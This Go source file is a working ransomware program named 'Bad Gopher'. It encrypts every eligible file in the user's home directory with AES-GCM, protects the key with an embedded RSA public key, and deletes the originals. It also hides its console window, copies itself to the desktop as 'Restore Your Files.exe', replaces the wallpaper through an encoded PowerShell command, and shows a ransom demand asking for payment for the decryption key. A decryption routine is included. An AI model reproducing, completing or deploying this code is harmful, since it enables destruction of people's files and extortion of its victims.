package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/faiface/beep"
	"github.com/faiface/beep/mp3"
	"github.com/faiface/beep/speaker"
	"github.com/gonutz/w32"
	"github.com/kardianos/osext"
	"github.com/reujab/wallpaper"
	"golang.org/x/text/encoding/unicode"
)

var magicBytes = []byte("BAD GOPHER\n")
var currentTime = []byte(time.Now().UTC().String() + "\n")

const suffix = ".gopher"

// Compresses a file into zip archive
// Param 1: path to a file to add to the zip.
func zipFile(filename string) ([]byte, error) {
	// Create buffer to store zipped file
	buf := new(bytes.Buffer)
	zipWriter := zip.NewWriter(buf)

	// Open file for reading
	fileToZip, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer fileToZip.Close()

	// Get the file information
	info, err := fileToZip.Stat()
	if err != nil {
		return nil, err
	}

	header, err := zip.FileInfoHeader(info)
	if err != nil {
		return nil, err
	}

	// Using FileInfoHeader() above only uses the basename of the file. If we want
	// to preserve the folder structure we can overwrite this with the full path.
	// header.Name = filename

	// Change to deflate to gain compression
	// see http://golang.org/pkg/archive/zip/#pkg-constants
	header.Method = zip.Store

	// Create writer for adding file to zip
	writer, err := zipWriter.CreateHeader(header)
	if err != nil {
		return nil, err
	}

	// Write the file to the zip
	_, err = io.Copy(writer, fileToZip)

	zipWriter.Close()

	return buf.Bytes(), err
}

// Decompresses a zip archive to a file
// Param 1: zip archive bytes to unzip
// Param 1: path to save the unzipped file
func unzipFile(archive []byte, filename string) error {
	zipReader, err := zip.NewReader(bytes.NewReader(archive), int64(len(archive)))
	if err != nil {
		return err
	}

	for _, zipFile := range zipReader.File {

		savePath := filepath.Join(filename)

		if zipFile.FileInfo().IsDir() {
			// Make Folder
			os.MkdirAll(savePath, os.ModePerm)
			continue
		}

		// Make File
		if err = os.MkdirAll(filepath.Dir(savePath), os.ModePerm); err != nil {
			return err
		}

		outFile, err := os.OpenFile(savePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, zipFile.Mode())
		if err != nil {
			return err
		}

		rc, err := zipFile.Open()
		if err != nil {
			return err
		}

		_, err = io.Copy(outFile, rc)

		outFile.Close()
		os.Chtimes(filename, zipFile.Modified, zipFile.Modified)
	}

	return err
}

// CSPRNG random byte generator
func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)

	if err != nil {
		return nil, err
	}

	return b, nil
}

// Encryption helper function
func encrypt(data []byte, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

// Decryption helper function
func decrypt(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println("You have provided an incorrect decryption file!")
		os.Exit(1)
	}
	return plaintext
}

// Encrypt file and save
func encryptFile(inputFilename string, outputFilename string, key []byte) {
	// Zip file first to preserve metadata
	zippedFile, _ := zipFile(inputFilename)
	f, _ := os.Create(outputFilename)
	defer f.Close()
	f.Write(encrypt(zippedFile, key))
}

// Decrypt file and save
func decryptFile(inputFilename string, outputFilename string, key []byte) {
	data, _ := ioutil.ReadFile(inputFilename)
	decryptedData := decrypt(data, key)

	unzipFile(decryptedData, outputFilename)
}

// Malware activation routine
func activate(home string, gopherFileName string) {
	// Copy executable to desktop
	executablePath, _ := osext.Executable()
	if _, err := os.Stat(executablePath); err == nil {
		input, err := ioutil.ReadFile(executablePath)
		if err != nil {
			fmt.Println(err)
			return
		}

		err = ioutil.WriteFile(home+"Desktop/"+"Restore Your Files.exe", input, 0777)
		if err != nil {
			fmt.Println(err)
			return
		}
	}

	// Extract Bad Gopher wallpaper
	desktopBackgroundDec, _ := base64.StdEncoding.DecodeString(desktopBackground)
	f, _ := os.Create(home + "BAD_GOPHER.jpg")
	f.Write(desktopBackgroundDec)
	f.Close()

	// Save old wallpaper for later restoration
	oldWallpaperPath, err := wallpaper.Get()
	if _, err := os.Stat(oldWallpaperPath); err == nil {
		// Copy wallpaper
		input, err := ioutil.ReadFile(oldWallpaperPath)
		if err != nil {
			fmt.Println(err)
			return
		}

		err = ioutil.WriteFile(home+"BAD_GOPHER_USER_WALLPAPER"+filepath.Ext(oldWallpaperPath), input, 0644)
		if err != nil {
			fmt.Println(err)
			return
		}
	}

	// Set the wallpaper
	err = wallpaper.SetFromFile(home + "BAD_GOPHER.jpg")
	if err != nil {
		fmt.Println(err)
	}

	// Special command for setting Windows wallpaper for <= Windows 7
	// EncodedCommand MUST be in UTF-16 LE encoding when encoded with base64
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-EncodedCommand", wallpaperCmdString)
		defer cmd.Start()
		defer cmd.Wait()
	}

	// Generate the symmetric AES encryption key
	key, _ := generateRandomBytes(32)

	// fmt.Printf("Symmetric key: %s\n", hex.EncodeToString(key))

	// Embed public key in embeddedFiles so no external files are needed
	pubPem, _ := pem.Decode(publicKey)
	pubKey, _ := x509.ParsePKCS1PublicKey(pubPem.Bytes)

	// Encrypt the symmetric key with the asymmetric public key
	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)

	// Save the decryption key and other information to the home directory
	keyFile, _ := os.Create(home + gopherFileName)
	keyFile.WriteString(hex.EncodeToString(ciphertext))
	keyFile.Close()

	// Save the decryption key and other information to the desktop
	keyFile, _ = os.Create(home + "Desktop/" + gopherFileName)
	keyFile.WriteString(hex.EncodeToString(ciphertext))
	keyFile.Close()

	// Go through every file in the starting directory and encrypt it
	filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Don't encrypt directories
		if info.IsDir() {
			if strings.ToLower(info.Name()) == "appdata" {
				return filepath.SkipDir
			}
			if strings.HasPrefix(info.Name(), ".") {
				return filepath.SkipDir
			}
			if strings.ToLower(info.Name()) == "node_modules" {
				return filepath.SkipDir
			}
			return nil
		}

		// Don't encrypt large files (>2GB)
		if info.Size() > 2000000000 {
			return nil
		}

		// Don't encrypt already encrypted files
		if strings.HasSuffix(info.Name(), suffix) {
			return nil
		}

		// Don't encrypt files that have already been encrypted
		if _, err := os.Stat(path + suffix); err == nil {
			return nil
		}

		// Don't encrypt the decryption key file
		if strings.Contains(strings.ToLower(info.Name()), "bad_gopher") {
			return nil
		}

		// Don't encrypt registry files
		if strings.Contains(strings.ToLower(info.Name()), "ntuser") {
			return nil
		}

		// Don't encrypt key files
		if strings.Contains(strings.ToLower(info.Name()), ".pem") {
			return nil
		}

		// Don't encrypt the desktop decryption binary
		if strings.Contains(strings.ToLower(info.Name()), "restore your files.exe") {
			return nil
		}

		encryptFile(path, path+suffix, key)

		// Destroy original file
		os.Remove(path)

		return nil
	})

	// Play audio
	audioDec, _ := base64.StdEncoding.DecodeString(audioData)

	// Create io.ReadCloser to stream audio from memory rather than saving file
	audioReadCloser := ioutil.NopCloser(bytes.NewReader(audioDec))
	streamer, format, err := mp3.Decode(audioReadCloser)
	if err != nil {
		log.Fatal(err)
	}
	defer streamer.Close()

	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))

	done := make(chan bool)
	speaker.Play(beep.Seq(streamer, beep.Callback(func() {
		done <- true
	})))

	<-done
}

// Malware deactivation and decryption routine
func deactivate(home string, decryptionKeyPath string) {
	// Load the symmetric decryption key provided
	decryptionKeyRaw, _ := ioutil.ReadFile(decryptionKeyPath)
	decryptionKey, _ := hex.DecodeString(string(decryptionKeyRaw))

	filepath.Walk(home, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Don't decrypt directories (they were never encrypted)
		if info.IsDir() {
			if strings.ToLower(info.Name()) == "appdata" {
				return filepath.SkipDir
			}
			if strings.HasPrefix(info.Name(), ".") {
				return filepath.SkipDir
			}
			if strings.ToLower(info.Name()) == "node_modules" {
				return filepath.SkipDir
			}
			return nil
		}

		// Only decrypt encrypted (.gopher) files
		if !strings.HasSuffix(info.Name(), suffix) {
			return nil
		}

		// Don't decrypt files that have already been decrypted
		if _, err := os.Stat(strings.ReplaceAll(path, suffix, "")); err == nil {
			return nil
		}

		decryptFile(path, strings.ReplaceAll(path, suffix, ""), decryptionKey)

		// Destroy original file
		os.Remove(path)

		return nil
	})

	// Restore the user's wallpaper
	files, _ := ioutil.ReadDir(home)

	for _, file := range files {
		if strings.Contains(file.Name(), "BAD_GOPHER_USER_WALLPAPER") {
			err := wallpaper.SetFromFile(home + file.Name())
			if err != nil {
				fmt.Println(err)
			}

			// Special command for setting Windows wallpaper for <= Windows 7
			// EncodedCommand MUST be in UTF-16 LE encoding when encoded with base64
			if runtime.GOOS == "windows" {
				cmdString := userWallpaperRestoreCmdString + file.Name() + "\")"
				encoder := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM).NewEncoder()
				cmdStringEnc, _ := encoder.String(cmdString)
				cmdStringB64 := base64.StdEncoding.EncodeToString([]byte(cmdStringEnc))
				cmd := exec.Command("powershell", "-EncodedCommand", cmdStringB64)
				defer cmd.Start()
				defer cmd.Wait()
			}
		}
	}

	fmt.Println("Your files have been restored! Thank you for your cooperation. You may delete the files from your desktop, but save \"BAD_GOPHER.txt\" for proof-of-payment.")
	fmt.Print("Press 'Enter' to exit...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}

func main() {
	home, _ := os.UserHomeDir()
	home = home + "/"
	gopherFileName := "BAD_GOPHER.txt"

	// Check if key file exists, if not run the program
	if _, err := os.Stat(home + gopherFileName); err != nil {
		if runtime.GOOS == "windows" {
			console := w32.GetConsoleWindow()
			if console != 0 {
				_, consoleProcID := w32.GetWindowThreadProcessId(console)
				if w32.GetCurrentProcessId() == consoleProcID {
					w32.ShowWindowAsync(console, w32.SW_HIDE)
				}
			}
		}
		activate(home, gopherFileName)
		return
	}

	// Start decryption if key file provided
	if len(os.Args) > 1 && strings.Contains(strings.ToLower(os.Args[1]), "bad_gopher_decrypt") {
		deactivate(home, os.Args[1])
		return
	}

	fmt.Println("You have been infected by the Bad Gopher virus. All your files have been encrypted")
	fmt.Println("BAD GOPHER has already been activated. No decryption key was provided.")
	fmt.Println("To decrypt your files, pay for your decryption key and drag the decryption file onto the \"Restore Your Files.exe\" file on your desktop.")
	fmt.Println("\nAlternatively, drag the decryption file onto the text here and press enter.")
	fmt.Print("\nPath to the decryption key: ")
	decryptionKeyPath, _ := bufio.NewReader(os.Stdin).ReadString('\n')
	decryptionKeyPath = strings.TrimSpace(decryptionKeyPath)

	if _, err := os.Stat(decryptionKeyPath); err == nil {
		deactivate(home, decryptionKeyPath)
	}
}
